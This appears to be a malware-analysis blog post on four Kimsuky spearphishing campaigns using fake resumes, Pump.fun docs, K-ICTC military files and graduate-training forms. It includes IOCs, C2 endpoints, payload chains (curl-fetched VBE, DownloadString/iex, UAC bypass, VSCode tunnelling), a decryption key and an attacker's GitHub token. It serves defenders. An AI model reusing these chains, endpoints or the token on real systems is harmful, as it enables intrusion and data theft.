---
title: Q1 2026 DPRK Operation Kimsuky Campaign Analysis
date: 2026-05-21 00:00:00 +0900
categories:
- Malware Analysis
tags:
- Kimsuky
- APT43
- DPRK
- spearphishing
- LNK
- RAT
- infostealer
- ROP
- VSCode-tunnel
author: mmamm4
---

# Q1 2026 DPRK Operation Kimsuky Campaign Analysis

## 1. Overview

This report analyzes four spearphishing campaigns conducted by the Kimsuky threat group in the first half of 2026.

Each campaign leverages target-tailored lure documents and infiltrates victim systems through diverse initial execution vectors, including LNK, JSE, and PowerShell scripts. Primary targets span corporate recruiters, cryptocurrency investors and developers, military and defense personnel, and employees of public institutions and large enterprises.

The attack flow consistently follows the pattern of displaying a lure document → dropping a payload → establishing persistence → conducting C2 communication and remote control. Notable instances include the abuse of legitimate services such as GitHub and VSCode tunnels.

Campaign #1 uses LNK files disguised as resumes, business cards, and medical documents to attempt UAC bypass and RAT installation. Campaign #2 masquerades as official technical documentation for Pump.fun, a Solana-based meme coin platform, to exfiltrate system information while leveraging GitHub as a C2 channel. Campaign #3 disguises itself as documents related to the K-ICTC international military exercise competition to target defense and military personnel, distributing MAC address-based customized payloads. Campaign #4 employs two JSE scripts disguised as graduate school commissioned training documents to either load a reconnaissance DLL or remotely control the victim's PC through VSCode tunneling.

![mal dark img.png](/assets/img/posts/2026-05-21-kimsuky-q1-campaign-analysis/mal_dark_img.png)

**Campaign Overview Comparison**

| Category | **Campaign #1** | **Campaign #2** | **Campaign #3** | **Campaign #4** |
| --- | --- | --- | --- | --- |
| **Lure Theme** | Resumes, business cards, medical/insurance documents | Pump.fun (Solana meme coin) technical documentation | K-ICTC International Science-Based Combat Management Competition | Graduate school master's evening program commissioned training |
| **Primary Targets** | Recruiters, business partners, medical/insurance organizations | Cryptocurrency traders, developers, investors | Army HQ, Joint Chiefs of Staff, Ministry of National Defense, foreign military attachés | Public institution and large enterprise employees, graduate school administrators |
| **Initial Vector** | LNK (PDF disguise) | LNK (PDF disguise) | LNK (PDF disguise) | JSE (HWPX disguise) |
| **Lure Document** | 1.pdf | Pumpfun-AI-Attack-Defence-Requirements.pdf | 2026 4th K-ICTC Information.pdf | HWPX commissioned training selection documents |

**Technical Characteristics Comparison**

| Category | **Campaign #1** | **Campaign #2** | **Campaign #3** | **Campaign #4** |
| --- | --- | --- | --- | --- |
| **Primary Payload** | PowerShell RAT (a.ps1) | PowerShell Infostealer (bpvme.ps1) | VBE → PowerShell (fileless) | DLL reconnaissance module / VSCode CLI |
| **C2 Channel** | Dedicated server (hxxps://nelark\[.\]icu) | GitHub repository (legitimate service abuse) | Dedicated IP (103.67.196\[.\]25) | Legitimate server abuse (yespp\[.\]co\[.\]kr) + GitHub OAuth |
| **Persistence Mechanism** | Startup folder LNK + Task Scheduler (5-minute interval) | Task Scheduler (OneDrive disguise, 60-minute interval) | Task Scheduler (15-minute interval) | VSCode tunnel (persistent remote access) |
| **Defense Evasion** | UAC disabling, Defender exclusion registration | Self-deletion, collected file deletion | Multi-layer obfuscation (animal-name variables) | Legitimate MS CDN abuse |
| **Target Identification** | UID-based polling | IP-timestamp-based filename | MAC address-based custom payload | (Bulk reconnaissance data collection) |

## 2. Campaign Analysis

#### Campaign #1

**Spearphishing Campaign Disguised as Resumes, Business Cards, and Medical/Insurance Documents**

![image.png](/assets/img/posts/2026-05-21-kimsuky-q1-campaign-analysis/image.png)

**Lure File Targets**

- **Resumes/Applications** — The name and contact format resembles resume headers, frequently used in spearphishing against corporate recruiters
- **Business Card Documents** — Masquerade as partner or customer contact information
- **Medical/Insurance Documents** — The "health blvd" address evokes medical institutions, suggesting disguise as medical or insurance paperwork

#### Attack Chain

The LNK file (1.pdf.lnk) is disguised as a standard PDF document and conceals two payloads embedded at specific byte offsets.

| Offset | Content | Storage Path |
| --- | --- | --- |
| After 20KB | Decoy PDF file | %TEMP%\1.pdf |
| 10KB–20KB | Persistence LNK file | Startup\OneDrive.lnk |

Upon execution, the LNK file extracts the decoy PDF and presents it to the victim as a legitimate document, while simultaneously creating OneDrive.lnk in the Startup folder to establish persistence. An additional script is then fetched and executed from the C2 server (hxxps://nelark\[.\]icu/xftaswx/res/bb.php), followed by a series of C2 communications and script executions.

| Stage | Action | Description |
| --- | --- | --- |
| Stage 1 | LNK file execution | Executes PDF-disguised shortcut → displays lure document + drops payload |
| Stage 2 | Initial C2 communication | Downloads and executes initial payload from C2 (/res/bb.php) |
| Stage 3 | UAC bypass | Downloads and executes 1.bat to disable UAC |
| Stage 4 | Persistence establishment | Registers Defender exclusion + Task Scheduler entry |
| Stage 5 | C2 remote control | Receives and executes commands at 5-second polling intervals |

**C2 Communication Summary by Request**

| Sequence | C2 Endpoint | Role | Executed Script |
| --- | --- | --- | --- |
| 1 | /xftaswx/res/bb.php | Initial payload | UAC check + bpersist PS1 |
| 2 | /xftaswx/res/post_proc.php?fpath=bpersist.ps1 | Persistence establishment | bpersist.ps1 |
| 3 | /xftaswx/res/bypass.b | UAC bypass | %TEMP%\1.bat |
| 4 | /xftaswx/res/index.php | UAC check result reporting | POST (uid, msg) |
| 5 | /xftaswx/res/post_proc.php?fpath=scheduler-once | Task Scheduler registration | scheduler-once.bat |
| 6 | /xftaswx/res/post_proc.php?fpath=a.ps1 | Main RAT loop | a.ps1 (including gCommand) |
| 7 | /xftaswx/res/get-command.php?uid={uid} | Remote command reception | Dynamic command execution |

#### Campaign #2

**Spearphishing Campaign Disguised as Official Cryptocurrency Technical Documentation**

![image.png](/assets/img/posts/2026-05-21-kimsuky-q1-campaign-analysis/image%201.png)

**Lure File Targets**

**1. Pump.fun Platform**

- Pump.fun is a Solana-based meme coin launchpad platform
- Traders, developers, and investors are the primary targets

**2. The "PumpGuard" Keyword**

- A fictitious security tool name that does not actually exist
- Disguised as an AI-based security solution related to Pump.fun
- Presented as official technical documentation through attack/defense requirements materials to establish credibility

#### Attack Chain

| Stage | Filename | Source | Storage Path | Primary Action | Next Stage |
| --- | --- | --- | --- | --- | --- |
| Stage 1 | firefox.ps1 | Created directly by the initial script | `%AppData%\firefox.ps1` | Decrypts and executes the encrypted script | Executes view.pdf, bpvme.ps1, wale.ps1 |
| Stage 2 | view.pdf | GitHub `/main/view.pdf` | `%TEMP%\Pumpfun-AI-Attack-Defence-Requirements.pdf` | Opens decoy PDF document | — |
| Stage 2 | bpvme.ps1 | GitHub `/main/1.txt` | `%AppData%\bpvme.ps1` | Collects system info → exfiltrates to GitHub → self-deletes | — |
| Stage 2 | wale.ps1 | Created directly by the initial script | `%AppData%\wale.ps1` | Registers Task Scheduler (starts after 15 min, repeats every 60 min) | Downloads and executes coks.ps1 |
| Stage 3 | coks.ps1 | GitHub `/main/2.txt` | `%AppData%\coks.ps1` | Unconfirmed payload | — |
| Persistence | Scheduler | Registered by wale.ps1 | Windows Task Scheduler | Disguised as OneDrive process, executes wale.ps1 every 60 minutes | Repeatedly executes coks.ps1 |
| Anti-forensics | — | — | — | Deletes initial script, firefox.ps1, bpvme.ps1, and collected data files | — |

**Initial Script Decryption Routine**

- key = "AB59097(*^zxcvbn   "

```
# i -> total length of the encrypted array
# j -> key length (19)
pw_num = key[j] + 103

# case 1: pw_num >= encrypted[i]
plain[i] = pw_num - encrypted[i]

# case 2: pw_num < encrypted[i]
plain[i] = encrypted[i]
```

**bpvme.ps1 (Infostealer) Data Collection**

| Collected Data | Command Used |
| --- | --- |
| IP Address | `Win32_NetworkAdapterConfiguration` |
| OS Information | `Win32_OperatingSystem` |
| System Information | `Win32_ComputerSystem` |
| Last Boot Time | `LastBootUpTime` |
| Device Type (Laptop/Desktop) | `PCSystemType` |
| Antivirus Product Name | `root\SecurityCenter2` |
| Running Process List | `Get-Process` |

**Attacker-Utilized GitHub Information**

| Field | Value |
| --- | --- |
| GitHub Account | `brandonleeodd93-blip` |
| Repository | `doc7` |
| GitHub PAT | `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` |
| Payload Paths | `/main/1.txt`, `/main/2.txt`, `/main/view.pdf` |
| Exfiltration Path | `/report/{IP}-{timestamp}-0956_info.txt` |

#### Campaign #3

**Spearphishing Campaign Disguised as International Military Exercise Documents**

![image.png](/assets/img/posts/2026-05-21-kimsuky-q1-campaign-analysis/image%202.png)

![image.png](/assets/img/posts/2026-05-21-kimsuky-q1-campaign-analysis/image%203.png)

**Lure File Targets**

- **Army Operational Personnel**
    - Army HQ Training Policy Division responsible for K-ICTC events
    - Joint Chiefs of Staff international cooperation and training officers
    - Ministry of National Defense policy staff
- **International Targets (English version)**
    - Foreign military attachés stationed in Korea
    - Military personnel from countries that previously participated in K-ICTC
    - Allied training liaison officers from U.S., Australian, and British militaries

#### Attack Chain

| Stage | Component | Action | Notes |
| --- | --- | --- | --- |
| Stage 1 | `2026 4th K-ICTC Information.pdf.lnk` | User execution | Shortcut file disguised with a PDF icon |
| Stage 2 | `curl` | Downloads `hxxp://103.67.196\[.\]25/conf.dat` → saves as `C:\Users\Public\Music\ant.vbe` | Fetches VBE from C2 server |
| Stage 3 | `ant.vbe` | Executes VBScript Encoded file, invokes PowerShell via WMI | Background execution |
| Stage 4 | PowerShell | Strips multi-layer obfuscation and assembles `(New-Object Net.WebClient).DownloadString()` call | Obfuscated with animal-name variables (`$tiger`, `$bear`, `$puma`) |
| Stage 5 | `getmac` | Collects system MAC address | Generates a victim-unique identifier |
| Stage 6 | C2 request | Requests payload at `hxxp://103.67.196\[.\]25/view1.php?type=apple&seed={MAC}` | MAC address-based custom payload delivery |
| Stage 7 | `iex` (×2) | First `iex` — fetches remote script; Second `iex` — fileless execution | Maintains persistence then executes remote commands |

#### Campaign #4

**Spearphishing Campaign Disguised as 2026 Graduate School Master's Evening Program Commissioned Training Selection Documents**

![image.png](/assets/img/posts/2026-05-21-kimsuky-q1-campaign-analysis/image%204.png)

**Lure File Targets**

- **Public Institution Employees**
    - Civil servants in central government ministries and local authorities
    - Employees of public enterprises and quasi-governmental organizations
- **Large Enterprise and Private Sector Employees**
    - Employees at companies with commissioned training programs for staff
- **Graduate School Administrative Staff**
    - Admission and administrative office staff at graduate schools receiving commissioned trainees

#### Attack Chain

This campaign distributes a single ZIP archive containing two JSE scripts. The filenames are `2026년 상반기 국내대학원 석사야간과정 위탁교육생 선발관련 서류.hwpx.jse` and a variant with `(1)` appended, both using double extensions (`.hwpx.jse`) to masquerade as Hangul word processor documents. Under Windows default settings, the `.jse` extension is hidden, causing the files to appear as `.hwpx` Hangul documents to the victim.

**Sample #1 — 2026년 상반기 국내대학원 석사야간과정 위탁교육생 선발관련 서류.hwpx.jse**

Upon execution, the JSE script first drops and opens a legitimate Hangul document to suppress victim suspicion. It then saves a Base64-encoded first-stage payload as `iIdypWi.zgyY` and decodes it via `certutil -decode` to produce the final malicious DLL `kE2I3TP.crqn`. The DLL is loaded via the `load` export of `rundll32.exe` and immediately performs initial reconnaissance across the victim system, covering antivirus software, network configuration, user accounts, and running processes.

**DLL Data Collection**

| Command | Collected Data |
| --- | --- |
| `Get-CimInstance -Namespace root/SecurityCenter2 -Classname AntivirusProduct` | Installed antivirus product names, versions, and status |
| `dir C:\` | C drive root directory listing |
| `dir C:\programdata` | Files and folders within ProgramData |
| `dir C:\Users` | User account listing |
| `tasklist` | Full list of currently running processes |
| `dir "C:\program files"` | Installed program listing |
| `dir "%USERPROFILE%\Desktop"` | Desktop file listing |
| `ipconfig /all` | IP address, MAC address, DNS servers, gateway, DHCP information |
| `route print` | Full routing table |
| `net user` | Local user account and group listing |
| `netstat -nao` | Active network connections, ports, and associated PIDs |
| `systeminfo` | OS version, patch level, architecture, domain, boot time, memory |
| `reg query HKCU\...\CurrentVersion\Run` | Current user startup registry entries |

**Sample #2 — 2026년 상반기 국내대학원 석사야간과정 위탁교육생 선발관련 서류 (1).hwpx.jse**

Upon execution, the JSE script similarly deceives the victim with a lure document, then downloads the VSCode CLI ZIP from Microsoft's official CDN. After extraction, `code.exe` is copied to `C:\ProgramData\`, any running `code.exe` processes are terminated to prevent duplicate execution, and the script proceeds to the tunneling phase.

**VSCode Tunneling Process**

| Stage | Actor | Action | Communication Target |
| --- | --- | --- | --- |
| 1 | Victim PC | Executes `code.exe tunnel --name bizeugene` | — |
| 2 | code.exe | Requests Device Code issuance from GitHub | `github\[.\]com` |
| 3 | GitHub | Issues one-time device code | → Victim PC |
| 4 | code.exe | Records device code in `out.txt` | Local |
| 5 | code.exe | Begins polling the `access_token` endpoint | `github\[.\]com/login/oauth/access_token` |
| 6 | JSE script | POSTs contents of `out.txt` to C2 server | `yespp\[.\]co\[.\]kr/common/include/code/out.php` |
| 7 | Attacker | Retrieves device code from C2 | `yespp\[.\]co\[.\]kr` |
| 8 | Attacker | Enters device code using attacker's GitHub account | `github\[.\]com/login/device` |
| 9 | GitHub | Authentication complete → returns access token | → Victim PC (code.exe) |
| 10 | code.exe | Activates tunnel | `vscode\[.\]dev/tunnel/bizeugene` |
| 11 | Attacker | Connects via tunnel → remotely controls victim PC | `vscode\[.\]dev/tunnel/bizeugene` |

## 3. Indicators of Compromise

**Campaign #1**
**MD5**
80088af673b0117dbd5cf528021dd970  1.pdf.lnk
c499e415f7e07f513d8319013a8b2e86  1.pdf.lnk.zip
0331a83b58231cb0cd3bfe319003ed1a  OneDrive.lnk
806fb7876b63ba89d2432cb831be01ba  a.ps1
c57a8b40d2ca402656ff3d778f42708c  bb.ps1
2689f58b803364bbfba2edb423a3b572  bpersist.ps1
552ca91696fedd387e1ea47f50f18344  scheduler-once.bat

**C2**
hxxps://nelark\[.\]icu/xftaswx/res/post_proc.php?fpath=a.ps1
hxxps://nelark\[.\]icu/xftaswx/res/post_proc.php?fpath=bpersist.ps1
hxxps://nelark\[.\]icu/xftaswx/res/index.php
hxxps://nelark\[.\]icu/xftaswx/res/post_proc.php?fpath=scheduler-once
hxxps://nelark\[.\]icu/xftaswx/res/bypass.b

**Campaign #2**
**MD5**
aa9d5dd632bb90addca480eaa5ff4382  PumpGuard-Pumpfun-AI-Attack-Defence-Requirements.pdf.lnk
5c2857913efc6007b3ee7028a132baa4  PumpGuard-Pumpfun-AI-Attack-Defence-Requirements.pdf.zip
6869766741b40825e31fd8bbff688bd3  bpvme.ps1
3fdce08723365d5c06e1183585164118  PumpGuard_Pumpfun_AI_Attack_Defence_Requirements_v2_1_GameEngine (2).rar
a3363e0c22c0356fdbcdc37f502bbcde  firefox.ps1
471faa43f4811a0250648d586cb3eebf  bpvme.ps1
8301fc2c740f6309864e68b6e429d0f0  whale.vbs
af7330af68a8f79b5a28fcc242e54a7e  doc_2026-03-26_08-58-03.NetAngular.pdf.zip
450774df6785e6eeb6ea906490905888  firefox.ps1
831d7c614ba32aa5d70ff9b0f259ee1d  wale.ps1

**C2**
※ *Legitimate GitHub service*
hxxps://raw.githubusercontent\[.\]com/brandonleeodd93-blip/doc7/main/1.txt
hxxps://raw.githubusercontent\[.\]com/brandonleeodd93-blip/doc7/main/view.pdf
hxxps://api.github\[.\]com/repos/brandonleeodd93-blip/doc7/contents/report/{IP}-{timestamp}-0956_info.txt

**Campaign #3**
**MD5**
b3c90f52e4b86a94ec637fee4354bb84  2026 4th K-ICTC Information.pdf.lnk
0dd1cf2d9a72fdbef19e77af59ba9d1f  2026 4th K-ICTC Information.pdf.zip
cbb059bd691d846e8279d617134d3129  conf.dat

**C2**
hxxp://103.67.196\[.\]25/conf.dat
hxxp://103.67.196\[.\]25/payload.dat
hxxp://103.67.196\[.\]25/view1.php?type=apple&seed={Mac}

**Campaign #4**
**MD5**
bb5040d54135b0999cc491b41a0a45e2  2026년 상반기 국내대학원 석사야간과정 위탁교육생 선발관련 서류 (1).hwpx.jse.zip
9fe43e08c8f446554340f972dac8a68c  2026년 상반기 국내대학원 석사야간과정 위탁교육생 선발관련 서류 (1).hwpx.jse
52f1ff082e981cbdfd1f045c6021c63f  2026년 상반기 국내대학원 석사야간과정 위탁교육생 선발관련 서류.hwpx.jse
bb9e9c893b170b3774c150b1d0b93a73  iIdypWi.zgyY
08160acf08fccecde7b34090db18b321  kE2I3TP.crqn

**C2**
hxxps://www.pyrotech\[.\]co\[.\]kr/common/include/tech/default.php
hxxps://www.yespp\[.\]co\[.\]kr/common/include/code/out.php

---

<style>.kr-code-block{margin:1em 0;border-radius:6px;overflow-x:auto;background:#272822;}.kr-code-block>code{display:block;white-space:pre;padding:1em;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:0.85em;line-height:1.5;color:#f8f8f2;background:transparent;}</style>
<details class="kr-orig" markdown="0"><summary>🇰🇷 한국어 원문</summary><div class="kr-content">
<h2>1분기 DPRK Operation Kimsuky 분석</h2>
<h2>1. 개요</h2>
<p>본 보고서는 2026년 상반기 확인된 Kimsuky 공격 그룹이 활용한 4가지 스피어피싱 캠페인을 분석합니다.</p>
<p>각 캠페인은 타깃 맞춤형 미끼 문서를 활용하며, LNK·JSE·PS 등 다양한 초기 실행 벡터를 통해 피해자 시스템에 침투합니다. 주요 공격 대상은 기업 채용 담당자, 암호화폐 투자자·개발자, 군·국방 관계자, 공공기관 및 대기업 직원 등으로 다양합니다.</p>
<p>공격 흐름은 공통적으로 미끼 문서 표시 → 페이로드 드롭 → 지속성 확보 → C2 통신 및 원격 제어 순서로 진행되며, GitHub·VSCode 터널 등 정상 서비스를 악용한 사례도 포함됩니다. 캠페인별 주요 특징은 다음과 같습니다.</p>
<p>캠페인 #1은 이력서·명함·의료 서류로 위장한 LNK 파일을 통해 UAC 우회 및 RAT 설치를 시도합니다. 캠페인 #2는 Solana 기반 밈코인 플랫폼(Pump.fun) 공식 문서로 위장하여 시스템 정보를 탈취하고 GitHub를 C2 채널로 활용합니다. 캠페인 #3은 국제 군사훈련 대회(K-ICTC) 관련 문서로 위장해 국방·군사 관계자를 표적으로 삼으며, MAC 주소 기반 맞춤형 페이로드를 배포합니다. 캠페인 #4는 대학원 위탁교육 서류로 위장한 JSE 스크립트 두 종을 통해 정찰용 DLL을 로드하거나 VSCode 터널링으로 피해자 PC를 원격 제어합니다.</p>
<p><strong>캠페인 개요 비교</strong></p>
<table>
<thead>
<tr>
<th>구분</th>
<th><strong>Campaign #1</strong></th>
<th><strong>Campaign #2</strong></th>
<th><strong>Campaign #3</strong></th>
<th><strong>Campaign #4</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>위장 주제</strong></td>
<td>이력서·명함·의료/보험 서류</td>
<td>Pump.fun (Solana 밈코인) 기술 문서</td>
<td>K-ICTC 국제과학화전투경영대회</td>
<td>국내대학원 석사야간과정 위탁교육</td>
</tr>
<tr>
<td><strong>주요 타깃</strong></td>
<td>채용 담당자, 거래처, 의료·보험 기관</td>
<td>암호화폐 트레이더·개발자·투자자</td>
<td>육군본부·합참·국방부, 주한 외국 무관부</td>
<td>공공기관·대기업 직원, 대학원 행정 담당자</td>
</tr>
<tr>
<td><strong>초기 벡터</strong></td>
<td>LNK (PDF 위장)</td>
<td>LNK (PDF 위장)</td>
<td>LNK (PDF 위장)</td>
<td>JSE (HWPX 위장)</td>
</tr>
<tr>
<td><strong>미끼 문서</strong></td>
<td>1.pdf</td>
<td>Pumpfun-AI-Attack-Defence-Requirements.pdf</td>
<td>2026 4th K-ICTC Information.pdf</td>
<td>위탁교육 선발 관련 HWPX 문서</td>
</tr>
</tbody>
</table>
<p><strong>기술적 특징 비교</strong></p>
<table>
<thead>
<tr>
<th>구분</th>
<th><strong>Campaign #1</strong></th>
<th><strong>Campaign #2</strong></th>
<th><strong>Campaign #3</strong></th>
<th><strong>Campaign #4</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>주요 페이로드</strong></td>
<td>PowerShell RAT (a.ps1)</td>
<td>PowerShell Infostealer (bpvme.ps1)</td>
<td>VBE → PowerShell (파일리스)</td>
<td>DLL 정찰 모듈 / VSCode CLI</td>
</tr>
<tr>
<td><strong>C2 채널</strong></td>
<td>자체 서버 (hxxps://nelark[.]icu)</td>
<td>GitHub 저장소 (정상 서비스 악용)</td>
<td>자체 IP (103.67.196[.]25)</td>
<td>정상 서버 악용(yespp[.]co[.]kr) + GitHub OAuth</td>
</tr>
<tr>
<td><strong>지속성 기법</strong></td>
<td>Startup 폴더 LNK + 작업 스케줄러 (5분 주기)</td>
<td>작업 스케줄러 (OneDrive 위장, 60분 주기)</td>
<td>작업 스케줄러 (15분 주기)</td>
<td>VSCode 터널 (지속 원격 접속)</td>
</tr>
<tr>
<td><strong>방어 우회</strong></td>
<td>UAC 비활성화, Defender 예외 등록</td>
<td>자가 삭제, 수집 파일 삭제</td>
<td>다중 난독화 (동물명 변수)</td>
<td>정상 MS CDN 활용</td>
</tr>
<tr>
<td><strong>타깃 식별 방식</strong></td>
<td>uid 기반 폴링</td>
<td>IP-시간 기반 파일명</td>
<td>MAC 주소 기반 맞춤 페이로드</td>
<td>(정찰 정보 일괄 수집)</td>
</tr>
</tbody>
</table>
<h2>2. 캠페인 분석</h2>
<h4>Campaign #1</h4>
<p><strong>이력서, 명함, 의료/보험 서류로 위장 스피어피싱 캠페인</strong></p>
<p><strong>미끼 파일 타깃</strong></p>
<ul>
<li><strong>이력서/지원서</strong> — 이름과 연락처 형식이 이력서 헤더와 유사하여 채용 담당자를 타깃으로 한 스피어 피싱에 자주 사용됨</li>
<li><strong>명함 정보 문서</strong> — 거래처나 고객 정보로 위장</li>
<li><strong>의료/보험 서류</strong> — "health blvd" 주소가 의료 관련 기관을 연상시켜 의료·보험 관련 서류로 위장할 가능성</li>
</ul>
<h4>공격 흐름</h4>
<p>LNK 파일(1.pdf.lnk)은 일반 PDF 문서로 위장되어 있으며, 내부에 오프셋 기반으로 두 개의 페이로드를 은닉하고 있습니다.</p>
<table>
<thead>
<tr>
<th>오프셋</th>
<th>내용</th>
<th>저장 경로</th>
</tr>
</thead>
<tbody>
<tr>
<td>20KB 이후</td>
<td>미끼용 PDF 파일</td>
<td>%TEMP%\1.pdf</td>
</tr>
<tr>
<td>10KB~20KB</td>
<td>지속성용 LNK 파일</td>
<td>Startup\OneDrive.lnk</td>
</tr>
</tbody>
</table>
<p>LNK 파일(1.pdf.lnk) 실행 시 미끼 PDF를 추출하여 피해자에게 정상 문서로 보여주고, 시작 프로그램 폴더에 OneDrive.lnk 파일을 생성하여 지속성을 확보합니다. 동시에 C2 서버(hxxps://nelark[.]icu/xftaswx/res/bb.php)에서 추가 스크립트를 가져와서 실행합니다.</p>
<table>
<thead>
<tr>
<th>단계</th>
<th>행위</th>
<th>설명</th>
</tr>
</thead>
<tbody>
<tr>
<td>1단계</td>
<td>LNK 파일 실행</td>
<td>PDF 위장 바로가기 파일 실행 → 미끼 문서 표시 + 페이로드 드롭</td>
</tr>
<tr>
<td>2단계</td>
<td>C2 초기 통신</td>
<td>C2 서버(/res/bb.php)에서 초기 페이로드 다운로드 및 실행</td>
</tr>
<tr>
<td>3단계</td>
<td>UAC 우회</td>
<td>1.bat 다운로드 및 실행으로 UAC 비활성화</td>
</tr>
<tr>
<td>4단계</td>
<td>지속성 확보</td>
<td>Defender 예외 등록 + 스케줄러 등록</td>
</tr>
<tr>
<td>5단계</td>
<td>C2 원격 제어</td>
<td>5초 간격 폴링으로 명령 수신 및 실행</td>
</tr>
</tbody>
</table>
<p><strong>C2 통신 시도별 행위 요약</strong></p>
<table>
<thead>
<tr>
<th>순서</th>
<th>C2</th>
<th>역할</th>
<th>실행 스크립트</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>/xftaswx/res/bb.php</td>
<td>초기 페이로드</td>
<td>UAC 확인 + bpersist PS1</td>
</tr>
<tr>
<td>2</td>
<td>/xftaswx/res/post_proc.php?fpath=bpersist.ps1</td>
<td>지속성 확보</td>
<td>bpersist.ps1</td>
</tr>
<tr>
<td>3</td>
<td>/xftaswx/res/bypass.b</td>
<td>UAC 우회</td>
<td>%TEMP%\1.bat</td>
</tr>
<tr>
<td>4</td>
<td>/xftaswx/res/index.php</td>
<td>UAC 확인 결과 보고</td>
<td>POST (uid, msg)</td>
</tr>
<tr>
<td>5</td>
<td>/xftaswx/res/post_proc.php?fpath=scheduler-once</td>
<td>스케줄러 등록</td>
<td>scheduler-once.bat</td>
</tr>
<tr>
<td>6</td>
<td>/xftaswx/res/post_proc.php?fpath=a.ps1</td>
<td>메인 RAT 루프</td>
<td>a.ps1 (gCommand 포함)</td>
</tr>
<tr>
<td>7</td>
<td>/xftaswx/res/get-command.php?uid={uid}</td>
<td>원격 명령 수신</td>
<td>동적 명령 실행</td>
</tr>
</tbody>
</table>
<h4>Campaign #2</h4>
<p><strong>암호 화폐 관련 공식 기술 문서로 위장 스피어피싱 캠페인</strong></p>
<p><strong>미끼 파일 타깃</strong></p>
<p><strong>1. Pump.fun 플랫폼</strong> — Pump.fun은 Solana 기반 밈코인 런치패드 플랫폼. 트레이더, 개발자, 투자자들이 주요 타깃.</p>
<p><strong>2. "PumpGuard" 키워드</strong> — 실제로 존재하지 않는 가상의 보안 도구명으로 추정. Pump.fun 관련 AI 기반 보안 솔루션처럼 위장.</p>
<h4>공격 흐름</h4>
<table>
<thead>
<tr>
<th>단계</th>
<th>파일명</th>
<th>출처</th>
<th>저장 경로</th>
<th>주요 행위</th>
<th>다음 단계</th>
</tr>
</thead>
<tbody>
<tr>
<td>1단계</td>
<td>firefox.ps1</td>
<td>최초 스크립트가 직접 생성</td>
<td><code>%AppData%\firefox.ps1</code></td>
<td>암호화된 스크립트 복호화 및 실행</td>
<td>view.pdf, bpvme.ps1, wale.ps1 실행</td>
</tr>
<tr>
<td>2단계</td>
<td>view.pdf</td>
<td>GitHub <code>/main/view.pdf</code></td>
<td><code>%TEMP%\Pumpfun-AI-Attack-Defence-Requirements.pdf</code></td>
<td>미끼 PDF 문서 실행</td>
<td>-</td>
</tr>
<tr>
<td>2단계</td>
<td>bpvme.ps1</td>
<td>GitHub <code>/main/1.txt</code></td>
<td><code>%AppData%\bpvme.ps1</code></td>
<td>시스템 정보 수집 → GitHub 유출 → 자가 삭제</td>
<td>-</td>
</tr>
<tr>
<td>2단계</td>
<td>wale.ps1</td>
<td>최초 스크립트가 직접 생성</td>
<td><code>%AppData%\wale.ps1</code></td>
<td>스케줄러 등록 (15분 후 시작, 60분 반복)</td>
<td>coks.ps1 다운로드 및 실행</td>
</tr>
<tr>
<td>3단계</td>
<td>coks.ps1</td>
<td>GitHub <code>/main/2.txt</code></td>
<td><code>%AppData%\coks.ps1</code></td>
<td>미확인 페이로드</td>
<td>-</td>
</tr>
<tr>
<td>지속성</td>
<td>스케줄러</td>
<td>wale.ps1 등록</td>
<td>Windows 작업 스케줄러</td>
<td>OneDrive 프로세스로 위장, 60분마다 wale.ps1 반복 실행</td>
<td>coks.ps1 반복 실행</td>
</tr>
<tr>
<td>증거인멸</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>최초 스크립트 삭제, firefox.ps1 삭제, bpvme.ps1 삭제, 수집 정보 파일 삭제</td>
<td>-</td>
</tr>
</tbody>
</table>
<p><strong>최초 스크립트 생성 복호화 루틴</strong> — key = "AB59097(*^zxcvbn   "</p>
<p><strong>bpvme.ps1(Infostealer) 수집 정보</strong></p>
<table>
<thead>
<tr>
<th>수집 정보</th>
<th>사용 명령</th>
</tr>
</thead>
<tbody>
<tr>
<td>IP 주소</td>
<td><code>Win32_NetworkAdapterConfiguration</code></td>
</tr>
<tr>
<td>OS 정보</td>
<td><code>Win32_OperatingSystem</code></td>
</tr>
<tr>
<td>시스템 정보</td>
<td><code>Win32_ComputerSystem</code></td>
</tr>
<tr>
<td>마지막 부팅 시간</td>
<td><code>LastBootUpTime</code></td>
</tr>
<tr>
<td>기기 유형 (노트북/데스크탑)</td>
<td><code>PCSystemType</code></td>
</tr>
<tr>
<td>안티바이러스 제품명</td>
<td><code>root\SecurityCenter2</code></td>
</tr>
<tr>
<td>실행 중인 프로세스 목록</td>
<td><code>Get-Process</code></td>
</tr>
</tbody>
</table>
<p><strong>공격자 활용 GitHub 정보</strong>: 계정 <code>brandonleeodd93-blip</code>, Repository <code>doc7</code>, PAT <code>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</code></p>
<h4>Campaign #3</h4>
<p><strong>국제과학화전투경영대회 관련 문서로 위장한 유형</strong></p>
<p><strong>미끼 파일 타깃</strong>: 육군본부 훈련정책 부서, 합참 국제협력 담당 장교, 국방부 정책 실무자, 주한 외국 무관부, 과거 K-ICTC 참가국 군 담당자</p>
<h4>공격 흐름</h4>
<table>
<thead>
<tr>
<th>단계</th>
<th>구성</th>
<th>행위</th>
<th>비고</th>
</tr>
</thead>
<tbody>
<tr>
<td>1단계</td>
<td><code>2026 4th K-ICTC Information.pdf.lnk</code></td>
<td>사용자 실행</td>
<td>PDF 아이콘으로 위장된 바로가기 파일</td>
</tr>
<tr>
<td>2단계</td>
<td><code>curl</code></td>
<td><code>hxxp://103.67.196[.]25/conf.dat</code> → <code>C:\Users\Public\Music\ant.vbe</code>로 저장</td>
<td>C2 서버에서 VBE 다운로드</td>
</tr>
<tr>
<td>3단계</td>
<td><code>ant.vbe</code></td>
<td>VBScript Encoded 파일 실행, WMI로 PowerShell 호출</td>
<td>백그라운드 실행</td>
</tr>
<tr>
<td>4단계</td>
<td>PowerShell</td>
<td>다중 난독화 해제 후 <code>DownloadString()</code> 조립</td>
<td>동물명 변수(<code>$tiger</code>, <code>$bear</code>, <code>$puma</code>)로 난독화</td>
</tr>
<tr>
<td>5단계</td>
<td><code>getmac</code></td>
<td>시스템 MAC 주소 수집</td>
<td>피해자 고유 식별자 생성</td>
</tr>
<tr>
<td>6단계</td>
<td>C2 요청</td>
<td><code>hxxp://103.67.196[.]25/view1.php?type=apple&amp;seed={MAC}</code></td>
<td>MAC 기반 맞춤 페이로드 요청</td>
</tr>
<tr>
<td>7단계</td>
<td><code>iex</code> (2회)</td>
